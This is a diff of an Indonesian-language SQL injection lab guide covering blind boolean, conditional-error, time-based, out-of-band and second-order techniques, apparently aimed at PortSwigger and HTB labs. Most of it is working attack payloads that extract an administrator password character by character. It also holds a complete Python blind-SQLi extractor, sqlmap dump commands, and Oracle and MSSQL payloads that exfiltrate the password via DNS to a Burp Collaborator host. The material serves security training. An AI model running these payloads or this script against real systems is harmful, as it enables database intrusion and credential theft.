+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+LIMIT+1)='a
+
+-- User 'administrator' ada?
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator')='a
+```
+
+### Cek Panjang Password
+
+```
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='a
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>10)='a
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>20)='a
+TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)=20)='a
+```
+
+### Ekstrak Password Karakter per Karakter
+
+```
+TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a
+TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='b
+...
+```
+
+Sampai ketemu karakter yang TRUE.
+
+### Burp Intruder untuk Automasi
+
+```
+[Burp] Send to Intruder (Ctrl+I)
+
+Attack type: Cluster Bomb
+Payload position 1 (posisi karakter): §1§
+Payload position 2 (karakter): §a§
+
+Payload:
+TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,§1§,1)+FROM+users+WHERE+username='administrator')='§a§
+
+Payload set 1: Numbers 1-20
+Payload set 2: a-z, 0-9
+
+Settings → Filter: Response contains "Welcome back!"
 ```
 
 ---
 
-## Detect Boolean Blind
+## 5.2 Blind — Conditional Errors (Lab 12)
 
-Normal:
+### 📌 Skenario
 
-```bash
-curl -s 'http://TARGET/item?id=10' -o normal
+Tidak ada teks indikator yang berbeda. Tapi bisa trigger database error (HTTP 500) secara kondisional:
+
+- Kondisi TRUE → paksakan error (divide by zero)
+- Kondisi FALSE → response normal
+
+### Payload Conditional Error — Oracle
+
+Gunakan `CASE WHEN`:
+
+```
+TrackingId=xyz'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||'
 ```
 
-TRUE:
+→ `1=1` TRUE → `TO_CHAR(1/0)` → divide by zero → **500 error**
 
-```bash
-curl -s \
-'http://TARGET/item?id=10%20AND%201=1' -o true
+```
+TrackingId=xyz'||(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||'
 ```
 
-FALSE:
+→ `1=2` FALSE → `''` (string kosong) → **200 normal**
 
-```bash
-curl -s \
-'http://TARGET/item?id=10%20AND%201=2' -o false
+### Konfirmasi User Administrator
+
+```
+TrackingId=xyz'||(SELECT+CASE+WHEN+(SELECT+COUNT(*)+FROM+users+WHERE+username='administrator')=1+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||'
 ```
 
-Bandingkan:
+→ 500 = user `administrator` ada
 
-```bash
-wc -c normal true false
+### Ekstrak Password (Conditional Error)
+
+```
+TrackingId=xyz'||(SELECT+CASE+WHEN+(SELECT+SUBSTR(password,1,1)+FROM+users+WHERE+username='administrator')='a'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+dual)||'
+```
+
+- 500 → karakter pertama adalah 'a'
+- 200 → bukan 'a'
+
+### PostgreSQL Conditional Error
+
+```
+[PgSQL]
+TrackingId=xyz'+AND+(SELECT+CASE+WHEN+(1=1)+THEN+1/0+ELSE+1+END)=1--
+TrackingId=xyz'+AND+(SELECT+CASE+WHEN+(username='administrator')+THEN+1/0+ELSE+1+END+FROM+users+LIMIT+1)=1--
+```
+
+### MySQL Conditional Error
+
+```
+[MySQL]
+'+AND+IF((SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a',(SELECT+1+UNION+SELECT+2),1)-- -
 ```
 
 ---
 
-# 4.2 Manual Boolean Extraction
+## 5.3 Manual Boolean Extraction
 
-## 📌 Kapan Digunakan
-
-Saat Boolean difference sudah terbukti dan ingin mengambil data sedikit demi sedikit.
-
-Misalnya target:
-
-```text
-database = shopdb
-```
-
-Kita tidak melihat hasil langsung.
-
----
-
-## Konsep SUBSTRING
-
-MySQL:
+### Konsep SUBSTRING + ASCII
 
 ```sql
-SUBSTRING(database(),1,1)
+-- Ambil karakter ke-1 dari nama DB
+SUBSTRING(database(), 1, 1) = 's'   -- cek langsung
+
+-- Binary search dengan ASCII (lebih efisien)
+ASCII(SUBSTRING(database(), 1, 1)) > 100
 ```
 
-Ambil karakter pertama:
+### Binary Search Workflow
 
-```sql
-SUBSTRING(database(),1,1)='s'
+```
+Karakter pertama DB — binary search:
+ASCII > 100?  → TRUE  (>100)
+ASCII > 110?  → TRUE  (>110)
+ASCII > 115?  → FALSE (≤115)
+ASCII > 112?  → TRUE  (>112)
+ASCII > 113?  → TRUE  (>113)
+ASCII > 114?  → TRUE  (>114)
+ASCII = 115 = 's'
 ```
 
-Jika TRUE:
+Mengapa binary search? 7 test = 1 karakter. Linear search = 26-96 test per karakter.
 
-```text
-database dimulai dengan s
+### Payload di Burp Repeater
+
 ```
-
----
-
-## ASCII
-
-```sql
-ASCII(SUBSTRING(database(),1,1)) > 100
-```
-
-Jika TRUE:
-
-```text
-ASCII karakter pertama > 100
-```
-
-Kemudian gunakan binary search:
-
-```text
-> 100?
-> 110?
-> 115?
-> 113?
+[MySQL]
+'+AND+ASCII(SUBSTRING(database(),1,1))>100-- -
+'+AND+ASCII(SUBSTRING(database(),1,1))>110-- -
+'+AND+SUBSTRING(database(),1,1)='s'-- -
 ```
 
 ---
 
-## Manual Example
+## 5.4 Automation dengan Python
 
-Test:
+### 📌 Kapan Digunakan
 
-```bash
-curl -s \
-'http://TARGET/item?id=10%20AND%20ASCII(SUBSTRING(database(),1,1))%3E100' \
--o result.txt
-```
+Saat manual extraction **terbukti berhasil** (TRUE/FALSE terkonfirmasi) tapi terlalu lambat.
 
-Cari indikator TRUE:
-
-```bash
-grep -q 'Product' result.txt && echo "TRUE" || echo "FALSE"
-```
-
-Kemudian:
-
-```bash
-curl -s \
-'http://TARGET/item?id=10%20AND%20ASCII(SUBSTRING(database(),1,1))%3E115' \
--o result.txt
-```
-
-Output:
-
-```text
-FALSE
-```
-
-Maka:
-
-```text
-ASCII(character 1) <= 115
-```
-
-Test:
-
-```text
-> 110 → TRUE
-> 115 → FALSE
-```
-
-Akhirnya:
-
-```text
-ASCII = 115
-```
-
-`115 = s`
-
-Karakter pertama:
-
-```text
-s
-```
-
----
-
-## Character-by-Character
-
-```text
-position=1 → s
-position=2 → h
-position=3 → o
-position=4 → p
-position=5 → d
-position=6 → b
-```
-
-Hasil:
-
-```text
-shopdb
-```
-
----
-
-# 4.3 Automation dengan Python
-
-## 📌 Kapan Digunakan
-
-Saat manual extraction berhasil tetapi terlalu lambat.
-
-Script berikut:
-
-- menerima URL
-    
-- menerima parameter
-    
-- mendeteksi TRUE berdasarkan marker
-    
-- melakukan binary search ASCII
-    
-- mencoba database name
-    
-- melakukan input validation
-    
+> **Jangan jalankan script ini tanpa konfirmasi manual terlebih dahulu.** Script tidak bisa menggantikan pemahaman injection context.
 
 ```python
 #!/usr/bin/env python3
+"""
+Boolean Blind SQLi Extractor — Generic cookie/parameter injector
+Cocok untuk PortSwigger-style dan HTB/THM labs
+
+Precondition:
+  - TRUE/FALSE response sudah terkonfirmasi manual
+  - true_marker sudah diidentifikasi
+  - SQL dialect sudah diidentifikasi (script ini default MySQL)
+"""
 
 import argparse
 import sys
 import time
 from urllib.parse import urlparse
-
 import requests
 
 
 def valid_url(value: str) -> str:
     parsed = urlparse(value)
-
     if parsed.scheme not in ("http", "https"):
-        raise argparse.ArgumentTypeError(
-            "URL must start with http:// or https://"
-        )
-
+        raise argparse.ArgumentTypeError("URL must start with http:// or https://")
     if not parsed.netloc:
-        raise argparse.ArgumentTypeError("Invalid URL")
-
+        raise argparse.ArgumentTypeError("Invalid URL: missing host")
     return value
 
 
 def valid_identifier(value: str) -> str:
     if not value.replace("_", "").replace("-", "").isalnum():
         raise argparse.ArgumentTypeError(
-            "Parameter must contain only letters, numbers, _ or -"
+            "Parameter name must contain only letters, numbers, _ or -"
         )
-
     return value
 
 
 def get_params():
     parser = argparse.ArgumentParser(
-        description="Simple Boolean Blind SQLi extractor for authorized labs."
+        description="Boolean Blind SQLi Extractor — authorized lab use only."
     )
-
+    parser.add_argument("--url", required=True, type=valid_url, help="Target URL")
     parser.add_argument(
-        "url",
-        type=valid_url,
-        help="Target URL"
-    )
-
-    parser.add_argument(
-        "-p",
-        "--parameter",
-        required=True,
+        "--cookie", default="TrackingId",
         type=valid_identifier,
-        help="Injectable parameter name"
+        help="Injectable cookie name (default: TrackingId)"
     )
-
     parser.add_argument(
-        "-m",
-        "--marker",
-        required=True,
-        help="Text that exists in TRUE response but not FALSE response"
+        "--marker", default="Welcome back",
+        help="Text present in TRUE response only"
     )
-
     parser.add_argument(
-        "-c",
-        "--characters",
-        type=int,
-        default=20,
-        help="Maximum characters to extract"
+        "--query",
+        default="SELECT password FROM users WHERE username='administrator'",
+        help="SQL expression to extract"
     )
-
-    parser.add_argument(
-        "-t",
-        "--timeout",
-        type=float,
-        default=10.0,
-        help="HTTP timeout"
-    )
-
+    parser.add_argument("--max-len", type=int, default=50, help="Max chars to extract")
+    parser.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout")
+    parser.add_argument("--delay", type=float, default=0.05, help="Delay between requests (s)")
     return parser.parse_args()
 
 
-def is_true(
-    session: requests.Session,
-    url: str,
-    parameter: str,
-    payload: str,
-    marker: str,
-    timeout: float
-) -> bool:
-
+def is_true(session, url, cookie_name, payload, marker, timeout):
+    cookies = {cookie_name: payload}
     try:
-        response = session.get(
-            url,
-            params={parameter: payload},
-            timeout=timeout
-        )
+        r = session.get(url, cookies=cookies, timeout=timeout)
+        return marker in r.text
     except requests.RequestException as exc:
         print(f"\n[!] Request error: {exc}", file=sys.stderr)
         return False
 
-    return marker in response.text
 
-
-def extract_db_name(
-    session: requests.Session,
-    url: str,
-    parameter: str,
-    marker: str,
-    max_length: int,
-    timeout: float
-) -> str:
-
+def extract_string(session, url, cookie_name, sql_query, marker, max_len, delay):
     result = []
+    print(f"[*] Extracting: {sql_query}")
 
-    print("[*] Starting database-name extraction")
-
-    for position in range(1, max_length + 1):
-
-        # First determine whether another character exists.
-        existence_payload = (
-            "10 AND "
-            f"ASCII(SUBSTRING(database(),{position},1))>0"
-        )
-
-        if not is_true(
-            session,
-            url,
-            parameter,
-            existence_payload,
-            marker,
-            timeout
-        ):
+    # Step 1: determine length
+    length = 0
+    for i in range(1, max_len + 1):
+        # Adjust SQL dialect as needed:
+        # MySQL: LENGTH()   PostgreSQL: LENGTH()   Oracle: LENGTH()
+        payload = f"xyz' AND (SELECT LENGTH(({sql_query})))>={i}-- -"
+        if is_true(session, url, cookie_name, payload, marker, 10):
+            length = i
+        else:
             break
 
-        low = 32
-        high = 126
+    if not length:
+        print("[-] Could not determine length. Verify marker and SQL dialect.")
+        return ""
 
-        while low <= high:
-            mid = (low + high) // 2
+    print(f"[*] Length: {length}")
 
-            payload = (
-                "10 AND "
-                f"ASCII(SUBSTRING(database(),{position},1))>{mid}"
-            )
-
-            if is_true(
-                session,
-                url,
-                parameter,
-                payload,
-                marker,
-                timeout
-            ):
-                low = mid + 1
+    # Step 2: binary search per character
+    for pos in range(1, length + 1):
+        lo, hi = 32, 126
+        while lo <= hi:
+            mid = (lo + hi) // 2
+            # MySQL: SUBSTRING()   PostgreSQL: SUBSTRING()   Oracle: SUBSTR()
+            payload = f"xyz' AND ASCII(SUBSTRING(({sql_query}),{pos},1))>{mid}-- -"
+            if is_true(session, url, cookie_name, payload, marker, 10):
+                lo = mid + 1
             else:
-                high = mid - 1
+                hi = mid - 1
 
-        char_code = low
-
+        char_code = lo
         if char_code < 32 or char_code > 126:
             break
-
         char = chr(char_code)
         result.append(char)
-
-        print(
-            f"\r[+] Progress: {''.join(result)}",
-            end="",
-            flush=True
-        )
-
-        time.sleep(0.05)
+        print(f"\r[+] Progress: {''.join(result)}", end="", flush=True)
+        time.sleep(delay)
 
     print()
-
     return "".join(result)
 
 
 def main():
     args = get_params()
-
     session = requests.Session()
-    session.headers.update({
-        "User-Agent": "CTF-SQLi-Lab-Testing"
-    })
+    session.headers["User-Agent"] = "Mozilla/5.0"
 
-    result = extract_db_name(
-        session=session,
-        url=args.url,
-        parameter=args.parameter,
-        marker=args.marker,
-        max_length=args.characters,
-        timeout=args.timeout
+    result = extract_string(
+        session, args.url, args.cookie,
+        args.query, args.marker, args.max_len, args.delay
     )
 
     if result:
-        print(f"[+] Database: {result}")
+        print(f"[+] Result: {result}")
     else:
-        print("[-] Could not extract database name.")
-        print("[-] Verify marker, parameter and SQL dialect.")
+        print("[-] Could not extract. Check: marker, SQL dialect, injection point.")
 
 
 if __name__ == "__main__":
     main()
 ```
 
-Install dependency:
+**Penggunaan:**
 
 ```bash
-python3 -m pip install requests
+# Dump password administrator (PortSwigger cookie-based)
+python3 boolean_blind.py \
+  --url "https://TARGET.web-security-academy.net/filter?category=Gifts" \
+  --cookie "TrackingId" \
+  --marker "Welcome back" \
+  --query "SELECT password FROM users WHERE username='administrator'"
+
+# Dump DB name (GET parameter-based — ubah script ke param injection jika perlu)
+python3 boolean_blind.py \
+  --url "http://TARGET/item" \
+  --marker "Product" \
+  --query "database()"
 ```
 
-Jalankan:
-
-```bash
-python3 blind_sqli.py \
-'http://TARGET/item' \
--p id \
--m 'Product'
-```
-
-Contoh:
-
-```text
-[*] Starting database-name extraction
-[+] Progress: s
-[+] Progress: sh
-[+] Progress: sho
-[+] Progress: shop
-[+] Progress: shopd
-[+] Progress: shopdb
-
-[+] Database: shopdb
-```
-
-> Script di atas memakai sintaks MySQL/MariaDB (`database()` dan `SUBSTRING()`). Untuk PostgreSQL/MSSQL, expression database harus diubah.
+> **[Oracle] Adaptation:** Ganti `SUBSTRING` → `SUBSTR`, `LENGTH` → `LENGTH` (sama), tambahkan `FROM dual` jika query standalone.
+> 
+> **[PgSQL] Adaptation:** Syntax `SUBSTRING()` sama; `ASCII()` sama.
 
 ---
 
-# ⏱️ 5. Time-Based Blind SQL Injection
+# ⏱️ 6. Time-Based Blind SQL Injection
 
-# 5.1 Konsep Time-Based
+## 6.1 Blind — Time Delays (Lab 14)
 
-## 📌 Kapan Digunakan
+### 📌 Skenario
 
-Gunakan saat:
+Tidak ada perbedaan response sama sekali. Tidak ada TRUE/FALSE. Tapi bisa paksa database untuk delay.
 
-```text
-Tidak ada output
-Tidak ada visible boolean difference
-Tetapi database dapat dipaksa delay.
+### Payload per Database
+
+**[PgSQL]** — Recommended form (type-safe):
+
+```
+TrackingId=xyz' AND 1=(SELECT 1 FROM pg_sleep(10))--
 ```
 
-Contoh:
+**[PgSQL]** — Lab 14 exact form (PortSwigger-specific):
 
-```text
-TRUE  → delay 5 sec
-FALSE → normal response
+```
+TrackingId=xyz'||pg_sleep(10)--
 ```
 
----
+> ⚠️ **[PgSQL] pg_sleep() caveat:** `pg_sleep()` mengembalikan tipe `void`. Operator `||` (string concat) pada `void` secara teknis adalah type mismatch di PostgreSQL strict mode. Lab PortSwigger menerima `||pg_sleep(10)` karena query context spesifik lab. Untuk portabilitas dan kejelasan, gunakan form `AND 1=(SELECT 1 FROM pg_sleep(10))` atau stacked query `%3BSELECT pg_sleep(10)--`.
 
-## Kapan Pilih Time-Based vs Boolean?
+**[MySQL]**:
 
-|Kondisi|Teknik|
-|---|---|
-|Output terlihat|UNION / Error-based|
-|TRUE/FALSE berbeda|Boolean Blind|
-|Tidak ada difference|Time-Based|
-|Tidak ada output dan timing tidak stabil|OOB dapat dipertimbangkan|
+```
+TrackingId=xyz' AND SLEEP(10)-- -
+```
 
----
+**[MSSQL]**:
 
-# 5.2 Manual Time-Based Test
+```
+TrackingId=xyz'; WAITFOR DELAY '0:0:10'--
+```
 
-## MySQL
+**[Oracle]**:
+
+```
+TrackingId=xyz'||dbms_pipe.receive_message(('a'),10)--
+```
+
+### Burp Suite Tips untuk Time-Based
+
+```
+[Burp] Repeater:
+1. Kirim payload → perhatikan response time di pojok kanan bawah Repeater
+2. Baseline biasanya <300ms
+3. Jika delay ~10s terkonfirmasi → Time-Based SQLi!
+
+[Burp] Settings → Project Options → Connections
+- Naikkan timeout jika request time-out sebelum 10s
+- Default timeout Burp = 120s, cukup untuk test
+```
 
 ```bash
+# Konfirmasi dengan time command
 time curl -s -o /dev/null \
-'http://TARGET/item?id=10%20AND%20SLEEP(5)'
+  --get --data-urlencode "id=10 AND 1=(SELECT 1 FROM pg_sleep(10))" \
+  'http://TARGET/item'
+# Ekspektasi: real ~10s
 ```
 
-Expected:
+---
 
-```text
-real    0m5.1s
+## 6.2 Blind — Time Delays + Data Retrieval (Lab 15)
+
+### Teknik: Delay Kondisional
+
+True → delay, False → tidak delay.
+
+### [PgSQL] — Conditional Sleep (Stacked Query)
+
+```
+TrackingId=xyz'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 ```
 
-Baseline:
+(`%3B` = `;` — stacked query)
+
+### Konfirmasi User Administrator
+
+```
+[PgSQL]
+TrackingId=xyz'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+```
+
+→ Delay 10s = user ada.
+
+### [MySQL] Conditional Sleep
+
+```
+TrackingId=xyz' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a', SLEEP(10), 0)-- -
+```
+
+### Ekstrak Password (PostgreSQL — Satu Karakter)
+
+```
+TrackingId=xyz'%3BSELECT+CASE+WHEN+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a'+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+```
+
+### Automasi dengan Burp Intruder (Time-Based)
+
+```
+[Burp] Intruder → Sniper:
+1. Tandai position karakter yang di-bruteforce
+2. Payload: a-z, 0-9
+3. Attack type: Sniper
+4. Setelah selesai: sort berdasarkan "Response received" (waktu response)
+   → Request paling lama = karakter yang benar!
+
+Columns → Response received → Sort descending
+```
+
+### Automasi dengan SQLMap
 
 ```bash
-time curl -s -o /dev/null \
-'http://TARGET/item?id=10'
-```
-
-Expected:
-
-```text
-real    0m0.1s
+# SQLMap lebih reliable untuk time-based karena handle timing automatically
+sqlmap -r request.txt \
+  --technique=T \
+  --time-sec=10 \
+  --dbms=PostgreSQL \
+  -D public -T users -C username,password \
+  --dump --batch
 ```
 
 ---
 
-## Threshold
+## 6.3 Per Database Syntax
 
-Jangan pakai satu request.
-
-Misalnya:
-
-```text
-baseline:
-0.15
-0.12
-0.18
-0.14
-
-delayed:
-5.12
-5.10
-5.14
-```
-
-Threshold praktis untuk lab:
-
-```text
-> baseline mean + several standard deviations
-```
-
-Untuk CTF sederhana:
-
-```text
-~3–5 seconds
-```
-
-biasanya lebih mudah dibedakan daripada delay sangat kecil.
-
----
-
-# 5.3 Per Database Syntax
-
-|DB|Sleep Command|Example & Catatan Penting|
+|DB|Unconditional Delay|Conditional Delay|
 |---|---|---|
-|MySQL|`SLEEP(5)`|`AND SLEEP(5)` atau `AND 1=1-- -`|
-|PostgreSQL|`pg_sleep(5)`|`AND 1=(SELECT 1 FROM pg_sleep(5))` atau `;SELECT pg_sleep(5)--`|
-|MSSQL|`WAITFOR DELAY '00:00:05'`|`AND 1=1; WAITFOR DELAY '00:00:05'`|
-|Oracle|`DBMS_PIPE.RECEIVE_MESSAGE`|`AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=0`|
-|SQLite|`SELECT sqlite_version()`|Tidak ada native sleep; ekstraksi tabel via `SELECT name FROM sqlite_master WHERE type='table'`|
+|MySQL|`AND SLEEP(10)-- -`|`AND IF(condition,SLEEP(10),0)-- -`|
+|PostgreSQL|`AND 1=(SELECT 1 FROM pg_sleep(10))--`|`%3BSELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END--`|
+|MSSQL|`; WAITFOR DELAY '0:0:10'--`|`; IF (cond) WAITFOR DELAY '0:0:10'--`|
+|Oracle|`\|dbms_pipe.receive_message('a',10)--`|`\|(SELECT CASE WHEN (cond) THEN dbms_pipe.receive_message('a',10) ELSE 1 END FROM dual)\|'`|
+|SQLite|Tidak ada native sleep|Tidak applicable (lihat note)|
 
-> ⚠️ **Catatan Teknis PostgreSQL `pg_sleep()`:**
-> Fungsi `pg_sleep()` di PostgreSQL mengembalikan tipe `void`. Jika dimasukkan langsung ke klausa `AND pg_sleep(5)` tanpa wrapper subquery, query engine PostgreSQL akan melempar type mismatch error. Gunakan bentuk subquery valid `AND 1=(SELECT 1 FROM pg_sleep(5))` atau stacked query `;SELECT pg_sleep(5)--`.
-
-Contoh PostgreSQL:
-
-```bash
-time curl -s -o /dev/null \
-'http://TARGET/item?id=10%20AND%201=(SELECT%201%20FROM%20pg_sleep(5))'
-```
-
-MSSQL:
-
-```bash
-time curl -s -o /dev/null \
-'http://TARGET/item?id=10%3BWAITFOR%20DELAY%20%2700:00:05%27'
-```
+> **[SQLite]:** SQLite tidak memiliki fungsi delay bawaan. Time-based blind umumnya tidak bisa dilakukan langsung. Alternatif: heavy computation query jika aplikasi mengizinkan (konteks CTF tertentu), tapi ini tidak reliable. Gunakan Boolean Blind jika memungkinkan.
+> 
+> **[MSSQL]:** `WAITFOR DELAY` memerlukan stacked query (`;`). Cek Section 11 untuk support matrix stacked queries.
 
 ---
 
-# 📡 6. Out-of-Band SQL Injection
+## 6.4 Kapan Pilih Time-Based vs Boolean
 
-# 6.1 Kapan OOB Dipakai
+|Kondisi|Teknik yang Dipilih|
+|---|---|
+|Output data terlihat di response|UNION / Error-Based|
+|TRUE/FALSE response berbeda (ukuran/konten)|Boolean Blind|
+|Tidak ada perbedaan visible, DB bisa delay|Time-Based|
+|Tidak ada output, timing tidak stabil, DB bisa callback|OOB|
 
-## 📌 Kapan Digunakan
-
-Gunakan ketika:
-
-```text
-Tidak ada visible output
-AND
-Boolean difference tidak terlihat
-AND
-Time-based tidak reliable
-AND
-DB/host dapat melakukan external callback
-```
-
-Flow:
-
-```text
-Application
-    │
-    ▼
-Database
-    │
-    ▼
-DNS / HTTP request
-    │
-    ▼
-Listener controlled by tester
-```
+> **Efisiensi:** Time-Based jauh lebih lambat dari Boolean Blind. Jika ada perbedaan response sekecil apapun (bahkan 1 byte), preferensikan Boolean Blind. SQLMap lebih reliable untuk Time-Based dibanding manual extraction.
 
 ---
 
-# 6.2 DNS Exfiltration — Konsep
+# 📡 7. Out-of-Band SQL Injection
 
-## MySQL / UNC Path
-
-Pada environment Windows, MySQL functionality tertentu dapat berinteraksi dengan UNC path bila server memiliki permission/network access.
-
-Contoh konsep:
-
-```text
-\\ATTACKER\share
-```
-
-Dalam lab, callback dapat terlihat pada DNS/SMB infrastructure.
-
----
-
-## MSSQL — `xp_dirtree`
+## 7.1 OOB Interaction (Lab 16)
 
 ### 📌 Kapan Digunakan
 
-Pada SQL Server ketika:
-
-```text
-xp_dirtree
+```
+Tidak ada visible output
+AND Boolean difference tidak terlihat
+AND Time-based tidak reliable
+AND DB / host bisa melakukan external network request
 ```
 
-tersedia dan SQL Server dapat membuat network request.
+### Precondition
 
-Konsep:
+- **Burp Suite Pro** → Burp Collaborator (subdomain untuk DNS/HTTP callback)
+- **Atau Interactsh** (free alternative): `https://app.interactsh.com/`
 
-```sql
-EXEC master..xp_dirtree '\\ATTACKER\share';
+```bash
+# Interactsh CLI
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+interactsh-client
+# Output: [INF] Listening on: xxxxxxxx.oast.pro
+```
+
+### [Oracle] — DNS Lookup via XXE
+
+```
+[Oracle] Precondition: UTL_HTTP, UTL_FILE, atau XMLType privilege tersedia
+
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+```
+
+### [MSSQL] — DNS via xp_dirtree
+
+```
+[MSSQL] Precondition: xp_dirtree tersedia, network egress diizinkan
+
+'+EXEC+master..xp_dirtree+'\\BURP-COLLABORATOR.oastify.com\a'--
+```
+
+### [MySQL] — DNS via LOAD_FILE (Windows Only)
+
+```
+[MySQL] Precondition: Windows host, FILE privilege, UNC path accessible
+
+'+AND+LOAD_FILE('\\\\\\\\BURP-COLLABORATOR.oastify.com\\\\a')-- -
+```
+
+> ⚠️ MySQL LOAD_FILE UNC path di SQL string: backslash `\` perlu di-escape. UNC path `\\HOST\a` = SQL string `'\\\\HOST\\a'` (4 backslash untuk dua, 2 untuk satu). Hanya berlaku di Windows host dengan network access.
+
+### Burp Collaborator Setup
+
+```
+[Burp Pro] Burp menu → Burp Collaborator client
+→ Copy to clipboard (dapat subdomain unik, misal: abcd.oastify.com)
+→ Masukkan subdomain ke payload
+→ Kirim request
+→ Di Collaborator: klik "Poll now"
+→ Jika ada DNS/HTTP interaction → OOB confirmed!
 ```
 
 ---
 
-## Listener
+## 7.2 OOB Data Exfiltration (Lab 17)
 
-Linux:
+### 📌 Tujuan
 
-```bash
-sudo tcpdump -ni any 'port 53 or port 445'
+Kirim data (misal password) sebagai bagian dari DNS lookup ke server kita.
+
+### [Oracle] — Exfil Password via DNS
+
+```
+'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.BURP-COLLABORATOR.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
 
-Atau:
+**DNS request yang ditangkap:**
 
-```bash
-sudo tcpdump -ni any host ATTACKER
+```
+s3cr3t_p4ssw0rd.BURP-COLLABORATOR.oastify.com
 ```
 
-DNS listener:
+Password muncul sebagai subdomain!
 
-```bash
-sudo tcpdump -ni any port 53
+### [MSSQL] — Exfil via xp_dirtree
+
+```
+[MSSQL] Stacked query:
+'; DECLARE @p VARCHAR(1024);
+SET @p=(SELECT password FROM users WHERE username='administrator');
+EXEC('master..xp_dirtree ''\\'+@p+'.BURP-COLLABORATOR.oastify.com\a''')--
 ```
 
-HTTP callback listener:
+### OOB Flow
 
-```bash
-python3 -m http.server 8000
 ```
-
----
-
-## OOB Flow
-
-```text
 Injected SQL
     │
     ▼
-Database
+Database proses query
     │
-    ├── DNS lookup
-    └── HTTP request
-          │
-          ▼
-       Listener
-          │
-          ▼
-     Callback proves
-     code execution path
+    ├── DNS lookup ke COLLABORATOR
+    └── HTTP request ke COLLABORATOR
+              │
+              ▼
+        Burp Collaborator / Interactsh
+              │
+              ▼
+        Data exfiltrated sebagai DNS subdomain
+        atau HTTP request body/path
 ```
 
-> OOB hanya membuktikan callback jika network egress dan privilege mendukung; kegagalan callback tidak otomatis membuktikan tidak ada SQLi.
+> **OOB hanya membuktikan callback jika network egress dan privilege mendukung.** Kegagalan callback tidak otomatis membuktikan tidak ada SQLi — bisa saja ada SQLi tapi egress diblok.
 
 ---
 
-# 🔁 7. Second-Order SQL Injection
-
-# 7.1 Konsep Second-Order
-
-## 📌 Kapan Digunakan
-
-Ketika payload tidak dieksekusi saat disimpan, tetapi menjadi SQL setelah digunakan kembali.
-
-Diagram:
-
-```text
-Input
- │
- ▼
-Register / Profile
- │
- ▼
-Stored in Database
- │
- ▼
-Later Feature
- │
- ▼
-Retrieval
- │
- ▼
-Dynamic SQL
- │
- ▼
-Injection Executes
-```
-
----
-
-## Contoh Konseptual
-
-Register:
-
-```text
-username = admin' OR '1'='1
-```
-
-Saat register:
-
-```text
-No obvious SQLi
-```
-
-Tetapi kemudian:
-
-```text
-Profile search
-Admin report
-User lookup
-Order history
-```
-
-menggunakan data tersimpan dalam query insecure.
-
----
-
-# 7.2 Cara Identify
-
-## 📌 Kapan Digunakan
-
-Cari fitur:
-
-```text
-registration
-profile update
-comment
-ticket
-address
-username
-saved search
-```
-
-Register payload harmless untuk lab:
-
-```text
-test'-- 
-```
-
-Kemudian trigger:
-
-```text
-GET /profile
-GET /search
-GET /admin/report
-```
-
-Perhatikan:
-
-```text
-SQL error
-unexpected result
-behavior change
-```
-
----
-
-# 🤖 8. SQLMap Workflow
-
-# 8.1 Instalasi & Verifikasi
-
-## 📌 Kapan Digunakan
-
-Saat manual testing sudah menunjukkan indikasi SQLi dan ingin mengotomasi detection/enumeration.
-
-Di Parrot:
-
-```bash
-sudo apt update
-sudo apt install sqlmap -y
-```
-
-Verifikasi:
-
-```bash
-sqlmap --version
-```
-
-Contoh:
-
-```text
-1.9.x
-```
-
-Help:
-
-```bash
-sqlmap -h
-```
-
----
-
-# 8.2 Basic Usage
-
-## GET Parameter
+# 🔁 8. Second-Order SQL Injection
 
 ### 📌 Kapan Digunakan
 
-```text
-http://TARGET/item?id=10
+Payload tidak dieksekusi saat disimpan, tapi menjadi SQL setelah digunakan kembali oleh fitur lain.
+
+### Diagram
+
+```
+User Input
+     │
+     ▼
+Register / Profile Update
+     │
+     ▼
+Stored di DB (mungkin ter-escape saat input, tapi raw di DB)
+     │
+     ▼
+Feature lain mengambil data dari DB
+     │
+     ▼
+Dynamic SQL built dari data tersimpan (tanpa escape)
+     │
+     ▼
+Injection Executes
 ```
 
-Command:
+### Contoh Konseptual
 
-```bash
-sqlmap \
--u "http://TARGET/item?id=10" \
---batch
+Register:
+
+```
+username = admin'--
 ```
 
-One-liner detection:
+Saat register: tidak ada error visible.
 
-```bash
-sqlmap -u "http://TARGET/item?id=10" --batch
